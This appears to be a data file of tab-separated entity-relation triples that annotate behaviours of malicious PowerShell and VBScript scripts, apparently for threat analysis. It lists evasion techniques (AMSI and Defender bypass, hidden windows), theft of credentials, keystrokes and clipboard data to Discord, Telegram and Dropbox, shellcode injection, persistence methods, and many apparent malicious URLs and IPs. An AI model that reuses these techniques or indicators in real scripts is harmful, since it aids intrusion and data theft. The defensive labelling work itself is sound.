+'app.asar' file	FILE	Saved	Exodus folder	APPLICATION PATH
+The script	SUB	Execute	code retrieved from remote server	REMOTE CODE
+The script	SUB	Create	lock file	FILE
+The script	SUB	Execute	Set-ExecutionPolicy Bypass -Scope Process -Force	Set-ExecutionPolicy COMMAND
+Set-ExecutionPolicy	Set-ExecutionPolicy COMMAND	Have	Bypass -Scope Process -Force	BYPASS PARAMETER	
+The script	SUB	Create	dlqp.ps1	EXE
+scheduled task	TASK	Execute	every 3 minutes	FREQUENCY
+script	SUB	Download	additional PowerShell script	EXE
+The script	SUB	Use	parameters with random names	PARAMETER WITH RANDOM NAME
+The script	SUB	Check	file size	FILE SIZE
+$OJTaNtrpGQ	OBF	Have	shellcode	CODE
+ZIP archive	COMPRESSED FILE	Saved	folder named after victim's hostname and username with timestamp	PATH
+The script	SUB	Collect	local IP address	PVI
+log.ps1	FILE	Saved	C:\ProgramData\log	ProgramData PATH
+The script	SUB	Collect	stolen credentials (URL, username, password)	PVI
+stolen credentials (URL, username, password)	PVI	SentTo	Discord webhook	WEBHOOK
+The script	SUB	Connect	C&C server	EXTERNAL SERVICE
+The script	SUB	Download	main.php	FILE
+The script	SUB	Define	Pia7LCEwRGx2iWRfTz7Z5JZsXbAOejdTR7L3v4CG1eeMPKmqDcWm1aFFSiJaBpR73eLKKokpw0yr4McNoKLBYrrg2FKMU2FbVGjb	FUNCTION
+Pia7LCEwRGx2iWRfTz7Z5JZsXbAOejdTR7L3v4CG1eeMPKmqDcWm1aFFSiJaBpR73eLKKokpw0yr4McNoKLBYrrg2FKMU2FbVGjb	FUNCTION	Have Name	random string	RANDOM STRING
+The script	SUB	Connect	kms8.msguides.com	URL
+PowerShell	PS COMMAND	Have	-ExecutionPolicy Bypass	BYPASS PARAMETER
+The script	SUB	Have	large byte sequence	OBF
+loop	LOOP	Collect	keystrokes	PVI
+The script	SUB	Connect	Discord webhook	WEBHOOK
+string with PowerShell script	PS COMMAND	Have	iex	IEX COMMAND
+The script	SUB	Execute	base64 encoding and hexadecimal conversions	OBF
+The script	SUB	Decode	Function from System.Management.Automation	FUNCTION
+The script	SUB	Execute	IO.Compression.DeflateStream	COMPRESSION WAPI
+Get-Clipboard cmdlet	COMMAND	Collect	data from clipboard	PVI
+XX.bat	EXE	Saved	directory in ProgramData	ProgramData PATH
+The script	SUB	Have	Execution Policy Bypass (-EP bypass)	BYPASS PARAMETER
+HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run	AUTORUN REGKEY	Have	rNTw8v4l	RANDOM KEY
+The script	SUB	Download	commands	COMMAND
+Collected system information	PVI	ConvertedTo	JSON files	FILE
+The script	SUB	Write	C:\Users\Owner\AppData\Local\Temp\tmpC47C.tmp	TEMP FILE
+The script	SUB	Write	C:\ProgramData\	ProgramData PATH
+$AB	FILE	Concatenated	$CC	FILE
+The script	SUB	Encrypt	collected data	PVI
+The script	SUB	Create	a directory in C:\ProgramData	ProgramData PATH
+The script	SUB	Include	Sleep commands	SLEEP
+The script	SUB	Encrypt	all files in the specified directory	FILE
+WD.vbs	EXE	Execute	batch files	EXE
+specific characters	STRING	Replaced with	!bh$%^v	STRING
+The script	SUB	Use	EnumWindows	EnumWindows WAPI
+obfuscated code	OBF	Have	base64 encoded string	OBF
+The script	SUB	Write	user's temporary folder	TEMP PATH
+Telegram bot	BOT	Send	collected privacy data	PVI	specific chat group	EXTERNAL CHAT GROUP
+collected privacy data	PVI	SentTo	specific chat group	EXTERNAL	SERVICE
+the script	SUB	Check	not running with administrator privileges	PREVILIEGE
+'YWGCNHBTTYGDVSHYYNDAIO.bat'	EXE	Is	Obfuscated Code	OBF
+The script	SUB	Connect	192.168.1.104:4444	IP ADDRESS
+PowerShell	PS COMMAND	Have	-ExecutionPolicy	Bypass PARAMETER
+WebClient object	WebClient	Connect	Firebase Storage	EXTERNAL SERVICE
+WD.PS1	EXE	Saved	directory in C:\ProgramData\WD	ProgramData PATH
+batch file	EXE	Have	-ExecutionPolicy	Bypass PARAMETER
+The script	SUB	Generate	Random File Names	FILE
+Random File Names	FILE	Have Name	random names	RANDOM STRING
+The script	SUB	Save	a file	FILE
+The script	SUB	Use	$GrubType	CUSTOMIZED PARAMETER
+a scheduled task	TASK	Execute	every 2 minutes	FREQUENCY
+The script	SUB	Have	Sleep and Randomization	SLEEP
+The script	SUB	Download	li6s.ba	EXE
+The script	SUB	Use	CreateThread	WAPI
+The script	SUB	Save	Set-up.exe	EXE
+Set-up.exe	EXE	Saved	$env:TEMP	TEMP PATH
+TravellingPositions_nopump.exe	EXE	Without	Digital Signature	SIGNATURE
+The script	SUB	Use	Reflection.Assembly	Reflection.Assembly WAPI
+files	FILE	Saved	MEMEMAN directory	PATH
+The script	SUB	Wait	5 seconds	SLEEP
+The script	SUB	Connect	13.38.57.254:8080	IP ADDRESS
+Receive-Job -Wait	PS COMMAND	Wait	the background job	BACKGROUND JOB
+Isass.exe	EXE	Hosted	http://serv223.bsdfksbdfj.pw/2.0/method/update	URL
+infinite loop	LOOP	Wait	15 seconds	TIME
+PowerShell command	PS COMMAND	Execute	a remote file	FILE
+The script	SUB	Access	system architecture	PVI
+Remove-Item	PS COMMAND	Delete	$env:TMP\BrowserData.txt	FILE
+$env:TMP\BrowserData.txt	FILE	Saved	TMP	TEMP PATH
+clipboard content	PVI	Include	current username	PVI
+The address of GetProcAddress	ADDRESS of Function	CopiedTo	byte sequence	DATA
+encoded payloads	OBF	Contain	commands or scripts	EXE
+The script	SUB	Have	-WindowStyle Hidden (-w hidden)	BYPASS PARAMETER
+getit	FUNCTION	Execute	PDF file	FILE
+Reflection.Assembly.Load	Assembly.Load WAPI	Load	Assembly	NET ASSEMBLY
+$EfuUwoMuEly	PARAMETER	Have	C# code	CODE
+decrypted data	DATA	CopiedTo	memory	MEMORY
+The script	SUB	Load	SetThreadContext	WAPI
+The script	SUB	Wait	infinite loop	LOOP
+The script	SUB	Have	keylogger	KEYLOGGER COMMAND
+Invoke-Expression	IEX COMMAND	Have	-Reverse	Reverse PARAMETER
+Invoke-Expression	IEX COMMAND	Have	-encodedcommand	encodedcommand PARAMETER
+PowerShell commands	PS COMMAND	Execute	CorSym.ps1	EXE
+The script	SUB	Download	executables and DLLs	EXE
+Run.BAT	EXE	Saved	Public folder	PUBLIC PATH
+The script	SUB	Create	TBFLVIISWLYQJRIYEDPLGO.bat	EXE
+The script	SUB	Check	Norton files	DEFENDER
+Payload	DATA	Loaded	executable memory	MEMORY
+The script	SUB	Have	$dxPnmeKyQHcMuDknTj	CUSTOMIZED PARAMETER
+The script	SUB	Saved	user's temp folder	TEMP PATH
+GDT	FUNCTION	Create	dynamic assembly	NET ASSEMBLY
+ETC.vbs	EXE	Execute	PowerShell command	EXE
+The script	SUB	Execute	rglimj.ba	EXE
+The script	SUB	Create	Potential C&C Communication String	DATA
+The script	SUB	Create	Cotrl.ps1	EXE
+The script	SUB	Have	Base64 encoded strings	OBF
+Dropbox account	EXTERNAL SERVICE	Accessed	$DropBoxAccessToken	TOKEN
+The script	SUB	Terminate	TCP client	PROCESS
+The script	SUB	Send	results of executed commands	DATA
+byte array	DATA	Have	.NET assembly from byte array	NET ASSEMBLY
+content of downloaded file	EXE	Hosted	https://radiocatolicalavozdedios.com/wp-includes/IXR/.en/C398574834rM.txt	URL
+The script	SUB	Load	.NET DLL	EXE
+WebClient object	WEBCLIENT	Set	the user agent string	USER AGENT
+The script	SUB	Have	obfuscated byte sequences and encoded strings	OBF
+The script	SUB	Drop	ps1 files	EXE
+dischat function	FUNCTION	Send	current logged-in user's username	PVI
+a file	FILE	Hosted	publicly accessible URLs	EXTERNAL URL
+a base64 encoded data	OBF	Hosted	https://cdn41.space/...	EXTERNAL URL
+The script	SUB	Allocate	Memory	MEMORY
+Get-Clipboard	COMMAND	Collect	clipboard contents	PVI
+The script	SUB	Check	virtual machine status	VM
+The script	SUB	Execute	Get-NetIPAddress	Get-NetIPAddress COMMAND
+The script	SUB	Use	Start-Sleep	SLEEP
+an encoded string	OBF	DecodedTo	a decoded string	DATA
+payload.zip	COMPRESSED FILE	Decompressed	$env:USERPROFILE\Music\Extracted	PATH
+The script	SUB	Create	VBScript (JJVXCDAUCHAIHBIEPXDBCS.vbs)	EXE
+CreateThread	WAPI	CalledWith	lpStartAddress: $TxQjboyw	CUSTOMIZED PARAMETER
+The script	SUB	Execute	retrieved method	METHOD
+The script	SUB	Write	.vbs	EXE
+The script	SUB	Collect	Domain trust data	PVI
+The script	SUB	Download	EPzLaSUIf.bin	EXE
+obfuscated data	DATA	CopiedTo	memory	MEMORY
+script	SUB	Execute	5 seconds	SLEEP
+The script	SUB	Start	process	PROCESS
+The script	SUB	Create	ZIP archive	COMPRESSED FILE
+The script	SUB	Execute	Function at allocated memory	FUNCTION
+Function	FUNCTION	Located	allocated memory	MEMORY
+PowerShell execution policy	PowerShell execution policy	SetTo	bypass	BYPASS PARAMETER
+The script	SUB	Create	scheduled task	TASK
+Reflection.Assembly	Reflection.Assembly WAPI	Execute	a method named "Execute"	EXE
+The script	SUB	Download	http://104.238.149.39/32345657687/A.docx	FILE
+http://104.238.149.39/32345657687/A.docx	FILE	Hosted	http://104.238.149.39/32345657687/	URL
+The script	SUB	Write	VsLabsData.ps1	EXE
+batch file	EXE	Execute	PowerShell command	EXE
+folder attributes	PATH	ChangedTo	Hidden	Hidden PROPERTY
+The script	SUB	Download	**LONG_BYTE_SEQUENCE**	OBF
+The script	SUB	Create	Microsoft.bat	EXE
+multiple files	FILE	Saved	C:\ProgramData	ProgramData PATH
+The script	SUB	Use	Obfuscated  Code	OBF CODE
+The script	SUB	Connect	remote server	REMOTE HOST
+The script	SUB	Download	rglimj.ba	EXE
+The script	SUB	Execute	start cmdlet	COMMAND
+The script	SUB	Have	-w hidden	PARAMETER
+Load method	FUNCTION	IsPartOf	AppDomain.CurrentDomain	AppDomain Class
+The script	SUB	OBF	long byte sequences	OBF
+The script	SUB	Use	obfuscation techniques	OBF
+the script	SUB	Lacks	user interaction	ACTION
+The script	SUB	Create	GTZYVDQNGLKWWAYUCNKYHE.vbs	EXE
+The script	SUB	Load	LoadLibrary	WAPI
+The script	SUB	Connect	10.0.0.10	IP ADDRESS
+$A123	PARAMETER	Forms	complete command	COMMAND
+The script	SUB	Collect	disk usage	PVI
+The script	SUB	Execute	while ($TRUE)	LOOP
+vgit function	CODE	Create	byte arrays	DATA
+The script	SUB	Wait	2 seconds	TIME
+CreateThread	WAPI	Create	a new thread	THREAD
+The script	SUB	Write	HKCU:\Software\Microsoft\Windows\CurrentVersion\Run	REGKEY
+InvokeSharpHound	COMMAND	IsPartOf	SharpHound3	FILE
+The script	SUB	Connect	192.168.56.101:4444	IP
+The script	SUB	Encode	Dropbox API credentials	PVI
+The script	SUB	Download	data from a URL	DATA
+The script	SUB	Execute	KeyLogger function	FUNCTION
+function 'IGEUWHBKBY'	FUNCTION	Have	two strings as arguments	STRING PARAMETER
+Start-Process	COMMAND	Execute	file.exe	EXE
+Invoke-Expression (IEX)	COMMAND	Have	-enc	ENCODED PARAMETER
+The script	SUB	Connect	http://89.23.98.75:7777/	URL
+The script	SUB	Delete	temporary file	PATH
+VirtualAlloc	WAPI	Allocate	memory	MEMORY
+The script	SUB	Write	WD.bat	EXE
+$env:COMPUTERNAME	ENV PARAMETER	Have	computer name	PVI
+The script	SUB	Collect	running processes	PVI
+PowerShell script	SUB	Use	Microsoft.VisualBasic	VisualBasic
+The script	SUB	Execute	$ClqZsAS	COMMAND
+The script	SUB	Have	-Enc	ENCODE PARAMETER
+The script	SUB	Have	-Stealth	PARAMETER
+attrib +h +s command	COMMAND	Change	file and folder attributes	ATTRIBUTE
+decoded Base64 string	OBF	Concatenated With	empty string	DATA
+bitsadmin	COMMAND	Have	-download	PARAMETER
+The script	SUB	Collect	specific file types	FILE INFO
+powershell -NoP -sta -w 1 -enc <encoded_command>	PS COMMAND	Have	-NoP	PARAMETER
+dischat function	FUNCTION	Execute	POST request	ACTION
+The script	SUB	Connect	170.130.165.37:443	IP
+shortcut	FILE	Have	True	RANDNAME
+The script	SUB	Execute	PowerShell command	EXE
+scheduled task	TASK	Execute	Daily at 12:00 PM	TIME_SCHEDULE
+The script	SUB	Wait	Start-Sleep -Seconds 10	SLEEP
+The script	SUB	Execute	'start-sleep'	COMMAND
+The script	SUB	Write	'Run.vbs'	EXE
+The script	SUB	Execute	Test-LHosts	COMMAND
+The script	SUB	Execute	powershell -NoP -sta -w 1 -enc <encoded_command>	PS COMMAND
+powershell -NoP -sta -w 1 -enc <encoded_command>	PS COMMAND	Have	-NoP -sta -w 1	BYPASS PARAMETER
+powershell -NoP -sta -w 1 -enc <encoded_command>	PS COMMAND	Have	-enc	ENCODED PARAMETER
+$ZfDKILmKGboYJ	OBF	Contains	unknown code	CODE
+The script	SUB	Set	-ExecutionPolicy Bypass	PARAMETER
+Get-ChildItem cmdlet	COMMAND	Have	search for files	ACTION
+The script	SUB	Execute	Web Requests	WEB REQUEST
+The script	SUB	Execute	Upload-Discord function	COMMAND
+Updater.exe	EXE	Downloaded from	http://62.182.84.61/4563636/	EXTERNAL SERVICE
+The script	SUB	Hide	console window	ENTITY
+The script	SUB	Convert	manipulated string	BYTE ARRAY
+delegate zV2s3	FUNCTION	Call	WaitForSingleObject	WAPI
+The script	SUB	Collect	Local admin users	PVI
+x86 assembly sequence	ASM	Execute	push zero onto stack	ACTION
+The script	SUB	Have	long Base64 string	OBF
+The script	SUB	Download	arx-Slkmrtswx.exe	EXE
+The script	SUB	Use	System.Reflection	WAPI
+The script	SUB	Create	VBScript file (Nothing.vbs)	EXE
+iex	COMMAND	Downloaded	'http://example.com/script.ps1'	URL
+PDF.ps1	FILE	Load	.NET assembly	NET ASSEMBLY
+The script	SUB	Decrypts	Base64 string	OBF
+The script	SUB	USE	PowerShell Remoting	PS COMMAND
+infinite loop	LOOP	Breaks On	script stop	EVENT
+The script	SUB	Runs	payload in 32-bit mode	DATA
+The script	SUB	Not	Self-replicate	ACTION
+install.ps1	EXE	Decode	long byte sequence	OBF
+The script	SUB	Have	rentolimanakasipondoromontipuno	FUNCTION
+The script	SUB	Place	Bin.ps1	EXE
+The script	SUB	Create	py.ps1	EXE
+The script	SUB	Collect	System information	PVI
+script	SUB	Execute	Method btXCLQIFCzVGcuqbDRRKXPLPi()	OBF
+The script	SUB	Decodes	two long strings	ACTION
+The script	SUB	AddAMSIExclusion	scheduled task	TASK
+The script	SUB	Inject	Cotrl.ps1	EXE
+The script	SUB	Use	Start-Process cmdlet	COMMAND
+$BRW	OBF	Execute	powershell.exe	PS COMMAND
+The script	SUB	Have	Base64 encoding	OBF
+loop	LOOP	Collect	clipboard data	PVI
+The script	SUB	Execute	'YWGCNHBTTYGDVSHYYNDAIO.bat'	EXE
+Write a file to disk	Write Action	Followed By	a short period of time	SLEEP
+The script	SUB	Have	Obfuscated strings and variable names	OBF
+The script	SUB	Change	user's Notepad	PROCESS
+Loader.vbs	EXE	Execute	Report.ps1	EXE
+putty.exe	EXE	Hosted	http://communicalink.com/putty.exe	URL
+The script	SUB	Collect	specific file types	DATA
+The script	SUB	EXECUTE	scheduled task	ACTION
+The script	SUB	Execute	InstallUtil.exe	EXE
+The script	SUB	Write	result\Software.csv	FILE
+The script	SUB	Use	Convert.FromBase64String	WAPI
+System information	PVI	Includes	full name	PVI
+The script	SUB	Execute	$screens.Bounds	COMMAND
+$y74gh00rffd	OBF	ConvertedTo	Hexadecimal	DATA
+The script	SUB	Create	shortcut in AppData folder	PATH
+The script	SUB	Create	C:\Users\Public\Run\Run.vbs	EXE
+The script	SUB	Modify	registry association	REGKEY
+The script	SUB	Encode	data	OBF
+Out-File	COMMAND	Create	qwerty.exe	EXE
+The script	SUB	Execute	WBPWTLJYGIAVQRJESQDYHO.ps1	EXE
+The script	SUB	Use	Marshal::Copy	WAPI
+The script	SUB	Check	wallet files for cryptocurrency clients	CRYPTOCURRENCY INFO
+The script	SUB	Bypass	proxy settings	PROXY SETTING
+The script	SUB	Decode	byte sequence	OBF
+VsLabsData.ps1	EXE	Execute	Decoded payloads	OBF
+The script	SUB	Create	Web server	Server
+The script	SUB	Use	Obfuscation	String OBF
+The script	SUB	Execute	A.docx	FILE
+Suspicious file	FILE	Hosted	user's AppData folder	PATH
+DLL ($ajsidjasidviajasidjaisjdjaisjd)	EXE	Invoke	EXECAQSAWAMAN	SUSPICIOUS METHOD
+The script	SUB	Write	.bat files	EXE
+The script	SUB	Collect	hostname	PVI
+The script	SUB	OBF	-enc	PARAMETER
+The script	SUB	Use	System.IO.Compression.DeflateStream	WAPI
+scheduled task	TASK	Set	run every 2 minutes	FREQUENCY
+malicious code	EXE	Saved	obfuscated byte arrays	OBF
+The script	SUB	Have	Keylogger	PVI
+email attachment	FILE	Contains	keylogged data	DATA
+mega.zip	COMPRESSED FILE	Decompressed	TravellingPositions_nopump.exe	EXE
+files with random names	FILE	Hosted	ProgramData folder	ProgramFilePath
+Batch file	FILE	Execute	PowerShell script	EXE
+The script	SUB	Check	BitBox folder	PATH
+powershell -windowstyle hidden	PS COMMAND	Have	-windowstyle hidden	BYPASS PARAMETER
+The script	SUB	Download	Insidious.exe	EXE
+The script	SUB	LOAD	.NET assembly	LIBRARY
+WD.vbs	EXE	Execute	WD.bat	EXE
+The script	SUB	Write	C:\Users\Public\output.txt	FILE
+keystrokes	PVI	Upload	remote server	REMOTE HOST
+The script	SUB	Execute	xmrig.exe	EXE
+Variable value	DATA	ConvertedTo	string	DATA
+The script	SUB	Execute	$_.ReadToEnd()	COMMAND
+The script	SUB	Use	String Obscurity	ACTION
+The script	SUB	Use	Nishang	PENTEST TOOLS
+The script	SUB	Execute	log-analyzer.exe	EXE
+Extracted data	OBF	Execute	PowerShell code	EXE
+The script	SUB	Define	$link	URL
+screenshots	PVI	SavedTo	$env:USERPROFILE\AppData\Local\Temp	PATH
+The script	SUB	Have	Base64 Encoded String	OBF
+The script	SUB	Upload	Dropbox account	EXTERNAL SERVICE
+The script	SUB	Use	-nop	PARAMETER
+The script	SUB	Have	Base64 Encoded String	OBF
+directory in ProgramData	PATH	Hosted	WD.bat	EXE
+Invoke-Expression	COMMAND	Have	-encodedcommand	ENCODED PARAMETER
+The script	SUB	Point	.lnk file	FILE
+SetupBypass	FUNCTION	Have	exception handling	ERR
+The script	SUB	Collect	IP addresses	PVI
+remote server	URL	Host	malicious software	EXE
+The script	SUB	Use	Net.WebClient class	CLASS
+two long strings	OBF	Is Decoded Into	byte arrays	ACTION
+The script	SUB	Collect	current username	PVI
+The script	SUB	Create	directory in ProgramData	PATH
+Scheduled Task	TASK	Execute	VBScript	EXE
+The script	SUB	Execute	pointer size check	ACTION
+Dropbox account	SERVICE	Accessed by	hardcoded Dropbox access token	PARAMETER
+The script	SUB	Decode	a long byte sequence	DATA
+upd.exe	EXE	Hosted	http://185.244.22.99/upd.exe	URL
+VirtualAlloc	WAPI	UsedBy	The script	SUB
+The script	SUB	Have	complex string of hexadecimal values ($jhwIqlfYTSv)	OBF
+c.exe	EXE	Hosted	http://89.23.98.75:7777/	URL
+script	SUB	Use	System.Drawing	WAPI
+.jar file	EXE	Executed By	'javaw.exe'	EXE
+The script	SUB	Monitor	specific key presses	ACTION
+The script	SUB	Execute	Reflection.Assembly	WAPI
+The script	SUB	Save	$env:TEMP	PATH
+Strings	STRING	ConvertedTo	Byte array	BYTEARRAY
+The script	SUB	Execute	Get-ChildItem cmdlet	COMMAND
+The script	SUB	Have	Hidden parameter	PARAMETER
+The script	SUB	Create	C:\ProgramData\mvfp	PATH
+The script	SUB	Executes	Invoke-Expression	COMMAND
+The script	SUB	Execute	Get-CimInstance	COMMAND
+The script	SUB	Bypass	Microsoft Defender for Endpoint	DEFENDER
+The script	SUB	Detect	antivirus software	DEFENDER
+$XyxpymgczR	DATA	Is	shellcode	EXE
+PowerShell command	PS COMMAND	Execute	PDF.ps1	FILE
+The script	SUB	Execute	XX.PS1	EXE
+The script	SUB	Check	Isass.exe	EXE
+getit	FUNCTION	Have	Arguments ($fz, $oulv)	PARAMETERS
+The script	SUB	Load and Execute	assembly from a byte array	ASSEMBLY
+encoded string	OBF	Have	http://publ01.b-cdn.net/brv/	URL
+File	EXE	Hosted	50.62.182.1	IP
+The script	SUB	Have	a Discord API	Discord API
+The script	SUB	Change Directory	$pzip	PATH
+The script	SUB	Execute	PowerShell code	CODE
+Invoke-Expression	COMMAND	Have	-RunAs32	PARAMETER
+The script	SUB	Change	memory protection of a function in amsi.dll	PROPERTY
+Get-NetIPAddress	PS COMMAND	Collect	local IP address	PVI
+Loader.vbs	EXE	Hosted	user's AppData folder	PATH
+The script	SUB	Create	Scheduled Task	ACTION
+The script	SUB	Have	$YHYA	OBF
+function O	FUNCTION	Have	byte arrays modification	ACTION
+The script	SUB	Execute	PasswordVault class	WAPI
+The script	SUB	Have	AMSI Bypass	ACTION
+$zOJyNrZqgSSiQH	OBF	Have	VirtualAlloc	WAPI
+The script	SUB	Use	Discord webhook	EXTERNAL URL
+The script	SUB	Use	Add-Type -TypeDefinition	COMMAND
+The script	SUB	Write	CgKYDo.exe	EXE
+scheduled task	TASK	Execute	malicious file	EXE
+The script	SUB	Upload	File's metadata	URL
+The script	SUB	Execute	PowerShell	EXE
+IEX	COMMAND	Execute	decoded base64 strings	OBF
+The script	SUB	Create	registry key HKCU:\Software\Microsoft\Windows\CurrentVersion\Run	REGKEY
+The script	SUB	Execute	powershell.exe	EXE
+tera15.zip	FILE	SavedTo	$2tP2ESoz	PATH
+The script	SUB	Use	default web proxy	PROXY
+specific file types	DATA	Include	password-related files	FILE
+scheduled task	TASK	Have	run every 1000 minutes	FREQUENCY
+delegate	DELEGATE	Execute	hidden payload	PAYLOAD
+The script	SUB	Modify	folder attributes	ATTRIBUTE
+The script	SUB	Execute	oil.exe	EXE
+The script	SUB	Use	Start-Sleep	SLEEP
+The script	SUB	Define	StartMain	FUNCTION
+kernel32.dll	DLL	Have	CreateThread	WAPI
+The script	SUB	Add Exclusion	.bat	EXE
+The script	SUB	Have	obfuscated strings	OBF
+WebClient	WAPI	Download	a URL	URL
+The script	SUB	Create	install.vbs	EXE
+The script	SUB	Use	obfuscation techniques	ACTION
+The script	SUB	Check	64-bit architecture	SYSTEM INFO
+The script	SUB	Have	Base64 Encoded Payload	OBF
+The script	SUB	Have	dischat function	FUNCTION
+web request	ACTION	Connect	185.81.157.21:555	IP ADDRESS
+The script	SUB	ACCESS	.NET framework directory	PATH
+The script	SUB	Create	New.BAT	EXE
+PowerShell	PS COMMAND	Have	-WindowStyle Hidden	PARAMETER
+The script	SUB	Use	WebClient	WAPI
+browser.exe	EXE	Hosted	GitHub URL	URL
+The script	SUB	Execute	attrib +h +s command	COMMAND
+The script	SUB	Execute	PowerShell execution policies	PowerShell execution policies
+The script	SUB	Disable	Windows Defender's real-time scanning	DEFENDER
+System.Text.Encoding.UTF8.GetString	WAPI	Decode	Base64 Strings	OBF
+The script	SUB	Have	$sDxscZEuvFbrhDWXKq	PARAMETER
+$juzfytNGBOpHp	OBF	Have	assembly code	CODE
+The script	SUB	Create	a directory	PATH
+VBScript coinmarketcap.vbs	EXE	Use	obfuscated strings	OBF
+The script	SUB	Read	C:\ProgramData\Document\x.ps1	FILE
+The script	SUB	Create	'Run.BAT'	EXE
+mezzanines.dll	DLL	Hosted	one of the six URLs in the $toxoplasmic array	URL
+The script	SUB	Dencrypt	a base64 string	OBF
+The script	SUB	Convert	hexadecimal strings to bytes	ACTION
+PowerShell script	SUB	Have	Obfuscated Code	OBF
+The script	SUB	Execute	New.vbs	EXE
+The script	SUB	Connect	$p$s/fef40df7	URL
+decoded PowerShell script	SUB	Create	scheduled task	TASK
+The script	SUB	Execute	rundll32.exe	EXE
+main function	FUNCTION	Is  Part of	SharpPrintNightmare namespace	NAMESPACE
+The script	SUB	Delete	$env:temp\keylogger.txt	FILE
+The script	SUB	Execute	shellcode	CODE
+The script	SUB	Download	http://13.230.14.133/S%!h%rv%!h%rbbbbbbbbbbbbbbbbbbbbb.txt	URL
+multiple files (.ps1, .bat, .vbs)	EXE	Hosted	a directory in C:\ProgramData	ProgramData PATH
+the script	SUB	Execute	Get-Clipboard cmdlet	Get-Clipboard COMMAND
+The script	SUB	Execute	NQCDVBTPJJZNYPPJBVTYLB.ps1	EXE
+The script	SUB	Execute	Sursdepa.vbs	EXE
+The script	SUB	Use	GetObject method	FUNCTION
+The script	SUB	Have	custom encryption/decryption algorithm	ENCRYPTION TOOL
+client32.exe	EXE	Added To	Windows registry Run key	AUTORUN REGKEY
+The script	SUB	Create	C:\ProgramData\WD	PATH
+The script	SUB	Have	base64 encoding	OBF
+The script	SUB	Allocate	memory	ACTION
+reverse or bind TCP connection	REVERSE/BIND TCP	Connect	remote server	REMOTE HOST
+specific message	MESSAGE	SentTo	Discord webhook	WEBHOOK
+The script	SUB	Write	specific byte sequence	DATA
+The script	SUB	Execute	Test-Connection	COMMAND
+The script	SUB	Check	running in a virtual machine	ACTION
+The script	SUB	Execute	a screenshot of the entire screen	SCREENSHOT
+'YWGCNHBTTYGDVSHYYNDAIO.bat'	EXE	Saved	'C:\ProgramData\YWGCNHBTTYGDVSHYYNDAIO'	ProgramData PATH
+public IP address	IP ADDRESS	Uploaded	Telegram bot	BOT
+The script	SUB	Create	VBScript file sqmapi.vbs	EXE
+ReturnShellAlosh function	FUNCTION	UsedIn	The script	ACTION
+The script	SUB	Extract	update.zip	COMPRESSED FILE
+DropBox-Upload function	COMMAND	Have	hardcoded Dropbox access token	PARAMETER
+The script	SUB	Contain	LONG_BYTE_SEQUENCE	DATA
+command-line arguments	COMMAND	Have	-exc Bypass	PARAMETER
+vbs files	EXE	Saved	C:\Users\Public\Music	PATH
+The script	SUB	Set	cookie with random value	COOKIE
+The script	SUB	Create	scheduled task 'det'	TASK
+The script	SUB	Remove	downloaded zip file	DOWNLOADED FILE
+The script	SUB	Create	QPXCNKQPGRJWIWPIQLPDOP.vbs	EXE
+The script	SUB	Monitor	Ctrl + C or Ctrl + X key combination	KEYBOARD EVENT
+The script	SUB	Set Attribute	xmrig.exe and config.json	EXE
+'readme.txt'	FILE	Hosted	'metaphysic' directory	PATH
+The script	SUB	Change	UAC consent prompt behavior	PERMISSION
+YWGCNHBTTYGDVSHYYNDAIO.bat	EXE	Saved	C:\ProgramData\YWGCNHBTTYGDVSHYYNDAIO	ProgramData PATH
+The script	SUB	Create	'C:\Users\Public\Run' folder	PATH
+The script	SUB	Use	System.IO.Compression.DeflateStream	COMPRESSION COMMAND
+$hBFNIeMq	VARIABLE	CopiedTo	Memory Space	MEMORY
+https://example.com/evil.exe	EXE	Hosted	https://example.com	URL
+The script	SUB	Upload	System Information	PVI
+The script	SUB	Collect	Operating System version	PVI
+Invoke-RestMethod cmdlet	Invoke-RestMethod COMMAND	Send	collected private information	PVI
+The script	SUB	Check	Global\AlreadyRunning19122345	MUTEX
+The script	SUB	Execute	XX.vbs	EXE
+The script	SUB	Wait	4.5 minutes	TIME
+The script	SUB	Use	System.IO.StreamReader	StreamReader WAPI
+The script	SUB	Create	scheduled task	TASK
+powershell -NoP -sta -w 1 -enc <encoded_command>	PS COMMAND	Have	-w 1	BYPASS PARAMETER
+batch file 1.bat	EXE	Execute	PowerShell script imcq.ps1	EXE
+The script	SUB	Execute	remote commands	COMMAND
+Invoke-WebRequest	COMMAND	Download	file.exe	EXE
+The script	SUB	Include	sleep commands	SLEEP
+The script	SUB	Create	batch script	EXE
+scheduled task	TASK	Have	TaskAction	COMMAND
+https://root-head.com/2708.bs64	URL	Have	Base64 encoded payload	OBF
+The script	SUB	Execute	curl	EXE
+The script	SUB	Create	mvfp.ps1	EXE
+The script	SUB	Have	obfuscated variable names	OBF
+The script	SUB	Have	$rNAjWamiWZfJuX	OBF
+The script	SUB	Download	https://dl.dropboxusercontent.com/s/lpoe7mktxd3zi1r/ps1.txt	FILE
+The script	SUB	Execute	Start-Process	SLEEP
+The script	SUB	Download	decapodvsWW.exe	EXE
+The script	SUB	Wait	3 seconds	TIME
+The script	SUB	Execute	Insidious.exe	EXE
+Invoke-Expression	IEX COMMAND	Have	-ExecutionPolicy	BYPASS PARAMETER
+The script	SUB	Execute	method 'Execute'	FUNCTION
+The script	SUB	Create	ZIP files	COMPRESSED FILE
+The script	SUB	Collect	Local IP address	PVI
+script	SUB	Save	captured images	PVI
+The script	SUB	Use	Base64 encoded strings	OBF
+dynamic assemblies	ASSEMBLY	Use	DefineDynamicModule	FUNCTION
+IEX (New-Object Net.WebClient).DownloadString	COMMAND	Have	DownloadString	Download COMMAND
+The script	SUB	Lack	user interaction	ACTION
+The script	SUB	Download	tr.zip	COMPRESSED FILE
+The script	SUB	Use	hardcoded Discord webhook URL	URL
+VBScript	EXE	Execute	XX.bat	EXE
+The script	SUB	Obfuscate	URL and data	OBF
+install.vbs	EXE	Hosted	user's AppData\Roaming\Logs folder	PATH
+PowerShell script (Document.ps1)	EXE	Execute	.NET executable	EXE
+a1f5abfa214411baa77e25f6ceaa6	FUNCTION	Have	True	RANDNAME
+Start-KeyLogger	COMMAND	Have	Keylogging functionality	PVI
+custom function go	FUNCTION	Convert	hexadecimal strings into byte arrays	ACTION
+C:\ProgramData\YWGCNHBTTYGDVSHYYNDAIO	PATH	Hosted	YWGCNHBTTYGDVSHYYNDAIO.ps1	EXE
+decapodvsWW.exe	EXE	Hosted	https://www.shalom.pt/50/	URL
+.NET assembly	ASSEMBLY	Download	**LONG_BYTE_SEQUENCE**	OBF
+scheduled tasks	TASK	Execute	VsLabs.vbs	EXE
+The script	SUB	Connect	10.0.0.1	IP
+The script	SUB	Download	an external URL	URL
+The script	SUB	Delete	scheduled task 'det'	TASK
